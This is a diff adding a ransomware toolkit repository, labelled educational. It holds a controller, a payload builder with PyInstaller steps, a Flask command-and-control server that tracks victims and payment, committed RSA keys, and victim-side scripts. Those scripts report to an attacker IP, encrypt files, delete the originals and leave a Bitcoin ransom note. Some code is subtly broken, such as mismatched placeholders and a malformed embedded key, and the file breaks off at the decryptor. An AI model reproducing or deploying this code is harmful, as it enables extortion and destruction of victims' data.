@@ -1,0 +1,1162 @@
+=== File: ./Attacker/main.py ===
+#!/usr/bin/env python3
+"""
+🎯 Ransomware Attacker Toolkit - Main Controller
+Run this single file to control everything
+"""
+
+import os
+import sys
+import subprocess
+import threading
+import time
+import webbrowser
+from datetime import datetime
+
+class AttackerToolkit:
+    def __init__(self):
+        self.kali_ip = None
+        self.c2_process = None
+        self.setup_directories()
+        
+    def setup_directories(self):
+        """Create necessary directories"""
+        for dir_name in ['data', 'logs', 'payloads']:
+            os.makedirs(dir_name, exist_ok=True)
+    
+    def print_banner(self):
+        """Display toolkit banner"""
+        banner = """
+        ╔══════════════════════════════════════════════════════════╗
+        ║         🎯 RANSOMWARE ATTACKER TOOLKIT - KALI            ║
+        ║             🔴 FOR EDUCATIONAL USE ONLY                  ║
+        ╚══════════════════════════════════════════════════════════╝
+        
+        [⚠️]  WARNING: Use only in isolated lab environments!
+        [⚠️]  Legal authorization required for testing!
+        
+        """
+        print(banner)
+    
+    def check_requirements(self):
+        """Check and install Python requirements"""
+        print("[1/6] 📦 Checking dependencies...")
+        
+        try:
+            subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], 
+                          check=True, capture_output=True)
+            print("   ✅ Dependencies installed")
+        except subprocess.CalledProcessError:
+            print("   ❌ Failed to install dependencies")
+            print("   [*] Try: pip install -r requirements.txt")
+            return False
+        
+        return True
+    
+    def generate_keys(self):
+        """Generate RSA encryption keys"""
+        print("[2/6] 🔑 Generating encryption keys...")
+        
+        try:
+            # Import and run key generation
+            sys.path.append('.')
+            from generate_key import generate_rsa_keys 
+            generate_rsa_keys()
+            print("   ✅ RSA keys generated in data/ directory")
+            return True
+        except Exception as e:
+            print(f"   ❌ Failed to generate keys: {e}")
+            return False
+    
+    def get_kali_ip(self):
+        """Get Kali Linux IP address"""
+        print("[3/6] 🌐 Detecting network configuration...")
+        
+        try:
+            # Try different methods to get IP
+            import socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            self.kali_ip = s.getsockname()[0]
+            s.close()
+            
+            print(f"   ✅ Your Kali IP: {self.kali_ip}")
+            print(f"   [*] Use this IP in victim payload")
+            return True
+        except:
+            print("   ❌ Could not auto-detect IP")
+            self.kali_ip = input("   [?] Enter your Kali IP manually: ").strip()
+            return bool(self.kali_ip)
+    
+    def start_c2_server(self):
+        """Start the C2 server in background"""
+        print("[4/6] 🖥️  Starting C2 Command Server...")
+        
+        def run_c2():
+            try:
+                from c2_server import C2Server
+                server = C2Server()
+                server.run()
+            except Exception as e:
+                print(f"   ❌ C2 Server error: {e}")
+        
+        # Start C2 in background thread
+        c2_thread = threading.Thread(target=run_c2, daemon=True)
+        c2_thread.start()
+        
+        # Give server time to start
+        time.sleep(3)
+        print("   ✅ C2 Server started on http://localhost:5000")
+        return True
+    
+    def build_payload(self):
+        """Build Windows ransomware payload"""
+        print("[5/6] 🛠️  Building Windows payload...")
+        
+        try:
+            # Import and run payload builder
+            from payload_builder import build_windows_payload
+            exe_path = build_windows_payload(self.kali_ip)
+            
+            print(f"   ✅ Payload built: {exe_path}")
+            print("   [*] Copy this to Windows VM for testing")
+            return True
+        except Exception as e:
+            print(f"   ❌ Failed to build payload: {e}")
+            print("   [*] Make sure keys were generated first")
+            return False
+    
+    def open_dashboard(self):
+        """Open C2 dashboard in browser"""
+        print("[6/6] 📊 Opening C2 Dashboard...")
+        
+        try:
+            webbrowser.open("http://localhost:5000")
+            print("   ✅ Dashboard opened in browser")
+            print("\n" + "="*60)
+            print("🎯 ATTACKER TOOLKIT READY!")
+            print("="*60)
+            print("\n📋 Next Steps:")
+            print("1. Send payload to Windows VM")
+            print("2. Run payload on Windows VM")
+            print("3. Monitor victims at: http://localhost:5000")
+            print("4. Use victim_manager.py to manage victims")
+            print("\n[⚠️]  Remember: Educational use in lab only!")
+            return True
+        except:
+            print("   ⚠️  Could not open browser automatically")
+            print("   [*] Manually visit: http://localhost:5000")
+            return True
+    
+    def show_menu(self):
+        """Show interactive menu after setup"""
+        while True:
+            print("\n" + "="*60)
+            print("🛠️  ATTACKER TOOLKIT MENU")
+            print("="*60)
+            print("1. 🔄 Rebuild payload with current IP")
+            print("2. 👥 View/manage victims")
+            print("3. 🖥️  Open C2 dashboard")
+            print("4. 📋 Show victim database")
+            print("5. 🔑 Show generated keys")
+            print("6. 🚪 Exit")
+            print("="*60)
+            
+            choice = input("\nSelect option (1-6): ").strip()
+            
+            if choice == "1":
+                self.build_payload()
+            elif choice == "2":
+                self.manage_victims()
+            elif choice == "3":
+                self.open_dashboard()
+            elif choice == "4":
+                self.show_victim_db()
+            elif choice == "5":
+                self.show_keys()
+            elif choice == "6":
+                print("\n[👋] Exiting Attacker Toolkit...")
+                break
+            else:
+                print("[❌] Invalid choice")
+    
+    def manage_victims(self):
+        """Manage victims using victim_manager"""
+        try:
+            from victim_manager import list_victims, decrypt_file_for_victim
+            
+            print("\n" + "="*60)
+            print("👥 VICTIM MANAGEMENT")
+            print("="*60)
+            
+            list_victims()
+            
+            victim_id = input("\nEnter victim ID to get key (or press Enter to skip): ").strip()
+            if victim_id:
+                decrypt_file_for_victim(victim_id)
+            
+            input("\nPress Enter to continue...")
+            
+        except Exception as e:
+            print(f"[❌] Error: {e}")
+    
+    def show_victim_db(self):
+        """Show raw victim database"""
+        import sqlite3
+        
+        print("\n" + "="*60)
+        print("📋 VICTIM DATABASE")
+        print("="*60)
+        
+        try:
+            conn = sqlite3.connect('victims.db')
+            c = conn.cursor()
+            c.execute("SELECT * FROM victims")
+            victims = c.fetchall()
+            conn.close()
+            
+            if not victims:
+                print("No victims yet")
+            else:
+                for v in victims:
+                    print(f"\nID: {v[0]}")
+                    print(f"  IP: {v[1]} | OS: {v[2]}")
+                    print(f"  Files: {v[3]} | Paid: {'✅' if v[5] else '❌'}")
+                    print(f"  Time: {v[6]}")
+        except:
+            print("No victim database found")
+    
+    def show_keys(self):
+        """Show generated encryption keys"""
+        print("\n" + "="*60)
+        print("🔑 ENCRYPTION KEYS")
+        print("="*60)
+        
+        if os.path.exists("data/operational_private.pem"):
+            with open("data/operational_private.pem", "r") as f:
+                priv_key = f.read().strip()
+                print("Private Key (KEEP SECURE!):")
+                print("-"*40)
+                print(priv_key[:100] + "...")
+                print("-"*40)
+        
+        if os.path.exists("data/operational_public.pem"):
+            with open("data/operational_public.pem", "r") as f:
+                pub_key = f.read().strip()
+                print("\nPublic Key (Embed in payloads):")
+                print("-"*40)
+                print(pub_key[:100] + "...")
+                print("-"*40)
+    
+    def run(self):
+        """Main execution flow"""
+        self.print_banner()
+        
+        # Check if running as root (optional for Kali)
+        if os.geteuid() != 0:
+            print("[⚠️]  Running without root privileges")
+        
+        # Ask for confirmation
+        print("[?] This will set up the ransomware attacker toolkit.")
+        confirm = input("Continue? (yes/no): ").lower()
+        
+        if confirm != "yes":
+            print("[👋] Operation cancelled")
+            return
+        
+        # Run setup steps
+        steps = [
+            self.check_requirements,
+            self.generate_keys,
+            self.get_kali_ip,
+            self.start_c2_server,
+            self.build_payload,
+            self.open_dashboard
+        ]
+        
+        for i, step in enumerate(steps):
+            if not step():
+                print(f"\n[❌] Setup failed at step {i+1}")
+                print("[*] Check logs and try again")
+                return
+        
+        # Show interactive menu
+        self.show_menu()
+
+def main():
+    """Main entry point"""
+    toolkit = AttackerToolkit()
+    toolkit.run()
+
+if __name__ == "__main__":
+    main()
+=== File: ./Attacker/requirements.txt ===
+flask==2.3.3
+cryptography==41.0.7
+=== File: ./Attacker/src/payload_template.py ===
+import os
+import base64
+import requests
+import socket
+import getpass
+import platform
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import uuid
+
+# Public key from attacker
+with open("./Keys/public_key.pem", "r") as f:
+    PUBLIC_KEY = f.read().strip()
+
+class SimpleRansomware:
+    def __init__(self):
+        self.c2_url = f"http://KALI_IP_HERE:5000/register"
+        self.victim_id = str(uuid.uuid4())[:8]
+        self.aes_key = os.urandom(32)
+        self.public_key = self.load_key()
+        
+    def load_key(self):
+        return serialization.load_pem_public_key(
+            PUBLIC_KEY.encode(),
+            backend=default_backend()
+        )
+    
+    def register_with_c2(self):
+        encrypted_key = self.public_key.encrypt(
+            self.aes_key,
+            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), 
+                        algorithm=hashes.SHA256(), label=None)
+        )
+        
+        data = {
+            'id': self.victim_id,
+            'os': platform.platform(),
+            'ip': socket.gethostbyname(socket.gethostname()),
+            'files': 0,
+            'key': base64.b64encode(encrypted_key).decode()
+        }
+        
+        try:
+            requests.post(self.c2_url, json=data, timeout=5)
+            print(f"[+] Registered with C2: {self.victim_id}")
+        except:
+            print("[-] C2 offline, continuing...")
+    
+    def encrypt_test_files(self):
+        """Encrypt files in current directory for demo"""
+        test_files = []
+        
+        # Look for .txt, .docx, .jpg files
+        for f in os.listdir('.'):
+            if f.endswith(('.txt', '.docx', '.jpg', '.png', '.pdf')):
+                test_files.append(f)
+        
+        if not test_files:
+            # Create test files
+            for i in range(3):
+                filename = f"test_document_{i}.txt"
+                with open(filename, 'w') as f:
+                    f.write(f"This is test document {i}\n")
+                test_files.append(filename)
+        
+        # Encrypt files
+        for filename in test_files:
+            try:
+                with open(filename, 'rb') as f:
+                    data = f.read()
+                
+                iv = os.urandom(16)
+                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
+                encryptor = cipher.encryptor()
+                encrypted = encryptor.update(data) + encryptor.finalize()
+                
+                with open(filename + '.locked', 'wb') as f:
+                    f.write(iv + encrypted)
+                
+                os.remove(filename)
+                print(f"[+] Encrypted: {filename}")
+            except:
+                print(f"[-] Failed: {filename}")
+        
+        return len(test_files)
+    
+    def create_ransom_note(self):
+        note = f"""
+        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
+        
+        To recover your files, contact the attacker.
+        
+        Your Victim ID: {self.victim_id}
+        
+        Don't try to decrypt files yourself!
+        """
+        
+        with open("READ_ME.txt", "w") as f:
+            f.write(note)
+        
+        print("[+] Ransom note created: READ_ME.txt")
+    
+    def run(self):
+        print("🔒 Starting ransomware simulation...")
+        print(f"Victim ID: {self.victim_id}")
+        
+        # Register with C2
+        self.register_with_c2()
+        
+        # Encrypt files
+        count = self.encrypt_test_files()
+        print(f"[+] Encrypted {count} files")
+        
+        # Create ransom note
+        self.create_ransom_note()
+        
+        # Clean up key
+        self.aes_key = b'0' * 32
+        
+        print("\n" + "="*50)
+        print("Ransomware simulation complete!")
+        print(f"Share this ID with attacker: {self.victim_id}")
+        print("="*50)
+        
+        input("\nPress Enter to exit...")
+
+if __name__ == "__main__":
+    ransomware = SimpleRansomware()
+    ransomware.run()
+=== File: ./Attacker/src/victim_manager.py ===
+
+import sqlite3
+
+def list_victims():
+    conn = sqlite3.connect('victims.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM victims")
+    victims = c.fetchall()
+    conn.close()
+    
+    print("\n" + "="*60)
+    print("🎯 VICTIM MANAGEMENT")
+    print("="*60)
+    
+    for v in victims:
+        status = "✅ PAID" if v[5] else "❌ UNPAID"
+        print(f"\nID: {v[0]}")
+        print(f"  OS: {v[2]} | Files: {v[3]}")
+        print(f"  Status: {status}")
+        print(f"  Time: {v[6]}")
+    
+    print("\n" + "="*60)
+
+def decrypt_file_for_victim(victim_id):
+    conn = sqlite3.connect('victims.db')
+    c = conn.cursor()
+    c.execute("SELECT key FROM victims WHERE id=?", (victim_id,))
+    result = c.fetchone()
+    conn.close()
+    
+    if result:
+        print(f"\n🔑 Decryption key for {victim_id}:")
+        print("-"*50)
+        print(result[0])
+        print("-"*50)
+        print("\nGive this key to the victim to use with decryptor.exe")
+    else:
+        print(f"Victim {victim_id} not found")
+
+if __name__ == "__main__":
+    list_victims()
+    
+    victim_id = input("\nEnter victim ID to get decryption key (or press Enter to skip): ")
+    if victim_id:
+        decrypt_file_for_victim(victim_id)
+=== File: ./Attacker/src/generate_key.py ===
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import os
+def generate_rsa_keys():
+    # Ensure Keys directory exists
+    os.makedirs("./Keys", exist_ok=True)
+
+    print("\n\nGenerating RSA private key...")
+
+    # Generate RSA Private Key
+
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    # Get RSA Public Key
+
+    public_key = private_key.public_key()
+
+    # Save Private Key to PEM file
+
+    private_pem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.PKCS8,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    with open("./Keys/private_key.pem", "wb") as f:
+        f.write(private_pem)
+    print("\nPrivate key saved to ./Keys/private_key.pem")
+
+    # Save Public Key to PEM file
+
+    public_pem = public_key.public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+
+    with open("./Keys/public_key.pem", "wb") as f:
+        f.write(public_pem)
+    print("\nPublic key saved to ./Keys/public_key.pem")
+    print("\nKey generation complete.")
+
+
+    print("\n\n[+] Keys saved:")
+    print("    private_key.pem - Keep this safe!")
+    print("    public_key.pem  - Embed in ransomware")
+    print("\n\n[+] Public key for payload:\n")
+    print("*" * 50)
+    print(public_pem.decode())
+    print("*" * 50)
+
+if __name__ == "__main__":
+    generate_rsa_keys()
+
+=== File: ./Attacker/src/payload_builder.py ===
+import base64
+import os
+from socket import socket
+
+print("[+] Building Windows Ransomware Payload...\n")
+
+# Read the Public Key
+with open("./Keys/public_key.pem", "rb") as f:
+    public_key = f.read().strip()
+
+# Read the Template
+with open("payload_template.py", "r") as f:
+    template = f.read()
+
+# Replace the placeholder with the actual public key
+try:
+    with open("./Keys/public_key.pem", "r") as f:
+        PUBLIC_KEY = f.read().strip()
+except FileNotFoundError:
+    raise Exception("Public key file not found")
+
+payload_code = template.replace("PUBLIC_KEY", PUBLIC_KEY)
+
+# Get Attacker IP 
+
+def get_attacker_ip():
+    hostname = socket.gethostname()
+    return socket.gethostbyname(hostname)
+
+attacker_ip = get_attacker_ip()
+print(f"[+] Attacker IP: {attacker_ip}")
+payload_code = payload_code.replace("ATTACKER_IP", attacker_ip) 
+
+# Save the final payload
+
+target = os.path.abspath(
+    os.path.join(os.path.dirname(__file__), '..', '..', 'Victim', 'ransomware.py')
+)
+os.makedirs(os.path.dirname(target), exist_ok=True)
+
+with open(target, 'w') as f:
+    f.write(payload_code)
+
+print("[+] Payload created: ransomware.py")
+print("[+] Convert to EXE on Windows using:")
+print("    pip install pyinstaller")
+print("    pyinstaller --onefile --noconsole ransomware.py")
+print("[+] Output will be in dist/ransomware.exe")
+=== File: ./Attacker/src/c2_server.py ===
+from flask import Flask, request, jsonify
+import sqlite3
+import json
+from datetime import datetime
+import threading
+import time 
+
+app = Flask(__name__)
+
+class C2Server:
+    def __init__(self):
+        self.setup_database()
+        print("[+]C2 Server initialized\n")
+        print("[+] Accepting connections on http://localhost:5000\n")
+    
+    # Set up the SQLite database
+    
+    def setup_database(self):
+        conn = sqlite3.connect('victims.db')
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS victims
+                    (id TEXT PRIMARY KEY, 
+                     ip TEXT, 
+                     os TEXT,
+                     files INTEGER,
+                     key TEXT,
+                     paid INTEGER DEFAULT 0,
+                     time TEXT)''')
+        conn.commit()
+        conn.close()
+
+    # Get all victims from the database
+
+    def get_victims(self):
+        conn = sqlite3.connect('victims.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM victims ORDER BY time DESC")
+        victims = c.fetchall()
+        conn.close()
+        return victims
+    
+    # Run the Dashboard server
+
+    def run(self, port=5000):
+        @app.route('/')
+        def dashboard():
+            victims = self.get_victims()
+            html = """
+            <html>
+            <head><title>Ransomware C2 Dashboard</title>
+            <style>
+                body { font-family: Arial; margin: 40px; background: #1a1a1a; color: white; }
+                .container { max-width: 800px; margin: 0 auto; }
+                .victim { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; }
+                .paid { border-left: 5px solid green; }
+                .unpaid { border-left: 5px solid red; }
+                button { background: #4CAF50; color: white; border: none; padding: 8px 15px; cursor: pointer; }
+            </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Ransomware C2 Dashboard</h1>
+                    <h3>Connected Victims: """ + str(len(victims)) + """</h3>
+            """
+            
+            for v in victims:
+                status = "PAID" if v[5] else "UNPAID"
+                color = "green" if v[5] else "red"
+                html += f"""
+                <div class="victim {'paid' if v[5] else 'unpaid'}">
+                    <strong>ID:</strong> {v[0]}<br>
+                    <strong>OS:</strong> {v[2]} | <strong>Files:</strong> {v[3]}<br>
+                    <strong>Status:</strong> <span style="color:{color}">{status}</span>
+                    <button onclick="markPaid('{v[0]}')">Mark Paid</button>
+                    <button onclick="getKey('{v[0]}')">Get Key</button>
+                </div>
+                """
+            
+            html += """
+                </div>
+                <script>
+                    function markPaid(id) {
+                        fetch('/mark_paid/' + id);
+                        setTimeout(() => location.reload(), 500);
+                    }
+                    function getKey(id) {
+                        fetch('/get_key/' + id)
+                            .then(r => r.json())
+                            .then(data => {
+                                if (data.key) {
+                                    prompt('Decryption Key:', data.key);
+                                }
+                            });
+                    }
+                </script>
+            </body>
+            </html>
+            """
+            return html
+        
+        @app.route('/register', methods=['POST'])
+        def register():
+            data = request.json
+            conn = sqlite3.connect('victims.db')
+            c = conn.cursor()
+            c.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?, ?, ?, ?)",
+                     (data['id'], data.get('ip', ''), data.get('os', ''),
+                      data.get('files', 0), data.get('key', ''),
+                      0, datetime.now().isoformat()))
+            conn.commit()
+            conn.close()
+            print(f"[+] New victim: {data['id']}")
+            return jsonify({'status': 'ok'})
+        
+        @app.route('/mark_paid/<victim_id>')
+        def mark_paid(victim_id):
+            conn = sqlite3.connect('victims.db')
+            c = conn.cursor()
+            c.execute("UPDATE victims SET paid=1 WHERE id=?", (victim_id,))
+            conn.commit()
+            conn.close()
+            print(f"[+] Marked as paid: {victim_id}")
+            return jsonify({'status': 'ok'})
+        
+        @app.route('/get_key/<victim_id>')
+        def get_key(victim_id):
+            conn = sqlite3.connect('victims.db')
+            c = conn.cursor()
+            c.execute("SELECT key FROM victims WHERE id=?", (victim_id,))
+            result = c.fetchone()
+            conn.close()
+            if result:
+                return jsonify({'key': result[0]})
+            return jsonify({'error': 'not found'})
+        
+        print(f"[+] Starting C2 server on port {port}")
+        app.run(host='0.0.0.0', port=port)
+
+if __name__ == '__main__':
+    server = C2Server()
+    server.run()
+=== File: ./Attacker/src/test.py ===
+import os
+
+target = os.path.abspath(
+    os.path.join(os.path.dirname(__file__), '..', '..', 'Victim', 'ransomware.py')
+)
+os.makedirs(os.path.dirname(target), exist_ok=True)
+
+with open(target, 'w') as f:
+    f.write('Hello, World!\n')
+
+print(f'Wrote file: {target}')
+=== File: ./Attacker/main2.py ===
+import sys
+import os
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from src.generate_key import generate_rsa_keys
+
+def main():
+    generate_rsa_keys()
+
+if __name__ == "__main__":
+    main()
+=== File: ./Attacker/Keys/public_key.pem ===
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlXQ8Nr4XGd1JH0qB+64v
+HuCv0X++cL41Xn1zjb0IDS1B+PASXbTVrTmTc/SOf85ZTjcwIUG/yLfqtA6fk088
+6PIaz/8Uzdt0JqEBmvazObUBLEfxdgvO2qal4khs6Av3/zqjO4gYAD7OQVNXrHqa
+Zp2WOhHwPoNFPvQmzR9mRzFPzzVsOV4Wzcf19/AZOufHOdPW1bS779KBrW+C9F/h
+jz4POXmSKUbCg+LgNDD2I6Joxb0oJ8Pd5RoMhlCH72tTFZVE57lCzEjlAdoLTm/m
+4zdBGSrgXPrzyUmxhSAdfIuaLXwkuRygAzNUJxrsy8Jx5Q8hnPGxjfX9uJPIIUkV
+2QIDAQAB
+-----END PUBLIC KEY-----
+
+=== File: ./Attacker/Keys/private_key.pem ===
+-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCVdDw2vhcZ3Ukf
+SoH7ri8e4K/Rf75wvjVefXONvQgNLUH48BJdtNWtOZNz9I5/zllONzAhQb/It+q0
+Dp+TTzzo8hrP/xTN23QmoQGa9rM5tQEsR/F2C87apqXiSGzoC/f/OqM7iBgAPs5B
+U1eseppmnZY6EfA+g0U+9CbNH2ZHMU/PNWw5XhbNx/X38Bk658c509bVtLvv0oGt
+b4L0X+GPPg85eZIpRsKD4uA0MPYjomjFvSgnw93lGgyGUIfva1MVlUTnuULMSOUB
+2gtOb+bjN0EZKuBc+vPJSbGFIB18i5otfCS5HKADM1QnGuzLwnHlDyGc8bGN9f24
+k8ghSRXZAgMBAAECggEAFHYb8lC3H/LkWnTcc+UmjV8sow2OuKfJ7bxWMC8TpZ4v
+HJJdqVejM3qg/eya/9Nz9ZnnrH3wcF4Bs5IW9deQ2sGeuyBMrFxhvBIqApnI8tsd
+pH7bB5LZSKUtK9xHkMNmuhpAk9tvkcUHfvkWlUYZ0ne7xAqFrkFRnytVDptAaPmZ
+OZsMTIDmTSIPoC2MEGs/aNlHptoGxJAiyfgee/pWje70HA+WMbzkPrcUnkJmm1Wg
+nHcSeWmgy7ZFEe6zp64RGV1smC1CulwS+Mha/rE41IQKxc4mmx+wusK/N/8PZnHy
+rHDeLur1Efnk40q+agYBd0T4gDg+30Z3Pms5hdlUgwKBgQDNDVWcMtmSghFUqEuY
+oZTra+aWP5HyHmqoY86tdDwuEIKLwS2xIBJFkPs3Y8oxmNdPer3TruXW6mgN8wCc
+OFRqMjkCDt/kbx6ZHbTQ+eJluDFa0KK1HqAiZFLQXk7uXNoQU00C7TQrt1ANj7iH
+XQDrOC7BljR+S6eOYPn4hltziwKBgQC6ln+XqOZUKXcRjDXV5SqFEMVddOuE6VxX
+KogKlLOZd2n0Zc1kHYC5nkj8TVrqqv+2cUgWW/Y6+5PxTW40X9VdV4a3o22B7NeE
+Sby5DViMmjqL4p5/WNLazAVyCuQW196WJw+3FICzChSjq6NXs4iiYsvA18wplhDK
+tCiHHlW4qwKBgDCOSsp9JBZUZIQ2ggg3owsIdwb3MLkzyK/tSoC6eJGz6SXs7cP2
+wzzj8wkPwU5zUfEJMLBSxyxYP6Gl/GwBzsOC9wrsuMngIk/BwBKISbsqnc1SgGUB
+Row+U3nyCyDYre6VuzPJNcRwWS2M7fZn6JLKsA+5YN7TTW8iua7HKhq3AoGBAIUj
+HBnwR6FoEPDxdfyQz70xEVM1OVSWWvBLhdTe9CQeQ/lCpsK4FoDcA8IbxDLMHzhk
+LobdyZ2eo5q7oFY4x3saGCNytpHNmJ5pKwN0FWoGJp5n7qZ5j8LVb1FHmib+k3Ha
+n2kIdSjLmZyLvTq3/Ve5XR/WG3TVAlhRItX+/DWPAoGARX/TYolWx9bRfgmC7bzX
+cl4WS7cle/V8zM4k7m8QwTjZNejPDNHR8+ibjrm2btNPQYoiHYlnL0lo9D4Y4f2I
+A2RgqgsnnLI+whd7mHduPoismU/qDHQJPUuEgU3yUSReXHxTBEcbATzdn4fSesjC
+kgDCX90cPIWEJYndnIxk99s=
+-----END PRIVATE KEY-----
+
+=== File: ./final.txt ===
+
+=== File: ./Victim/main.py ===
+
+=== File: ./Victim/README.txt ===
+
+=== File: ./Victim/src/ransomware.py ===
+"""
+Ransomware Demo - Victim Side
+Run this on Windows VM
+"""
+
+import os
+import base64
+import requests
+import socket
+import platform
+import uuid
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+print("="*60)
+print("🔒 RANSOMWARE SIMULATION - VICTIM SIDE")
+print("⚠️  FOR EDUCATIONAL USE IN VM ONLY!")
+print("="*60)
+
+# Configuration - CHANGE KALI_IP to your attacker IP
+KALI_IP = "192.168.1.100"  # ⬅️ CHANGE THIS!
+C2_URL = f"http://{KALI_IP}:5000/register"
+
+# Public key (will be replaced by attacker)
+PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzK6I5GvJXqLw5R7vT8M8
+pG6+J9wM2iY7F3sKq1A4bB5zJm8N6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6
+qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5v
+R2sN6qL3aV2sP7rT4Y6mG9+W3xL8jMkQ5vR2sN6qL3aV2sP7rT4Y6mG9+W3xL8j
+-----END PUBLIC KEY-----'''
+
+class VictimRansomware:
+    def __init__(self):
+        self.victim_id = str(uuid.uuid4())[:8]
+        self.aes_key = os.urandom(32)
+        self.public_key = self.load_public_key()
+        print(f"Victim ID: {self.victim_id}")
+    
+    def load_public_key(self):
+        """Load the attacker's public key"""
+        return serialization.load_pem_public_key(
+            PUBLIC_KEY.encode(),
+            backend=default_backend()
+        )
+    
+    def contact_attacker(self):
+        """Send encrypted key to attacker's C2 server"""
+        # Encrypt AES key with RSA public key
+        encrypted_aes = self.public_key.encrypt(
+            self.aes_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+        
+        # Prepare victim data
+        data = {
+            'id': self.victim_id,
+            'os': platform.platform(),
+            'ip': socket.gethostbyname(socket.gethostname()),
+            'key': base64.b64encode(encrypted_aes).decode(),
+            'files': 0
+        }
+        
+        # Send to attacker
+        try:
+            response = requests.post(C2_URL, json=data, timeout=5)
+            if response.status_code == 200:
+                print("[+] Successfully contacted attacker C2")
+                return True
+        except Exception as e:
+            print(f"[-] Could not contact attacker: {e}")
+        
+        return False
+    
+    def create_test_files(self):
+        """Create demo files to encrypt"""
+        test_files = []
+        for i in range(5):
+            filename = f"my_document_{i+1}.txt"
+            with open(filename, 'w') as f:
+                f.write(f"This is document #{i+1}\n")
+                f.write("Important company data here...\n")
+            test_files.append(filename)
+            print(f"[+] Created: {filename}")
+        return test_files
+    
+    def encrypt_files(self, filenames):
+        """Encrypt files with AES"""
+        encrypted_count = 0
+        
+        for filename in filenames:
+            try:
+                # Read file
+                with open(filename, 'rb') as f:
+                    data = f.read()
+                
+                # Generate random IV
+                iv = os.urandom(16)
+                
+                # Create AES cipher
+                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
+                encryptor = cipher.encryptor()
+                
+                # Encrypt data
+                encrypted_data = encryptor.update(data) + encryptor.finalize()
+                
+                # Save encrypted file
+                encrypted_name = filename + ".encrypted"
+                with open(encrypted_name, 'wb') as f:
+                    f.write(iv + encrypted_data)  # IV + encrypted data
+                
+                # Remove original
+                os.remove(filename)
+                
+                print(f"[✓] Encrypted: {filename}")
+                encrypted_count += 1
+                
+            except Exception as e:
+                print(f"[✗] Failed: {filename} - {e}")
+        
+        return encrypted_count
+    
+    def create_ransom_note(self):
+        """Create instructions for victim"""
+        note = f"""
+        ╔══════════════════════════════════════════════════════════╗
+        ║                 YOUR FILES ARE ENCRYPTED!                ║
+        ╚══════════════════════════════════════════════════════════╝
+        
+        All your important files have been encrypted with military-grade
+        AES-256 encryption.
+        
+        🔑 Your Victim ID: {self.victim_id}
+        
+        To recover your files:
+        1. Contact the attacker with your Victim ID
+        2. Pay $1000 in Bitcoin
+        3. Receive decryption key
+        
+        ⚠️ WARNING:
+        • Do NOT delete encrypted files
+        • Do NOT use recovery software
+        • Do NOT restart your computer
+        
+        ───────────────────────────────────────────────────────────
+        This is a simulation for educational purposes only.
+        Files are encrypted but can be recovered with decryptor.py
+        ───────────────────────────────────────────────────────────
+        """
+        
+        with open("!!!READ_ME!!!.txt", "w") as f:
+            f.write(note)
+        
+        print("[+] Ransom note created: !!!READ_ME!!!.txt")
+    
+    def run(self):
+        """Main execution"""
+        print("\n[1/4] Contacting attacker C2 server...")
+        self.contact_attacker()
+        
+        print("\n[2/4] Creating test files...")
+        files = self.create_test_files()
+        
+        print("\n[3/4] Encrypting files...")
+        count = self.encrypt_files(files)
+        print(f"   → Encrypted {count} files")
+        
+        print("\n[4/4] Creating ransom note...")
+        self.create_ransom_note()
+        
+        # Securely wipe AES key from memory
+        self.aes_key = b'0' * 32
+        
+        print("\n" + "="*60)
+        print("✅ SIMULATION COMPLETE!")
+        print(f"📋 Your Victim ID: {self.victim_id}")
+        print("📝 Share this ID with attacker to get decryption key")
+        print("="*60)
+        
+        input("\nPress Enter to exit...")
+
+if __name__ == "__main__":
+    # Safety check - warn if not in VM
+    if platform.system() != "Windows":
+        print("⚠️  This is designed for Windows systems!")
+    
+    print("This will encrypt files in the current directory.")
+    print("Make sure you're in a Windows VM!")
+    
+    confirm = input("\nContinue? (yes/no): ").lower()
+    if confirm == 'yes':
+        malware = VictimRansomware()
+        malware.run()
+    else:
+        print("Cancelled.")
+        
+=== File: ./Victim/src/decryptor.py ===
+"""
+File Decryptor for Victims
+Run this after getting key from attacker
+"""
+
+import os
+import base64
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+print("="*60)
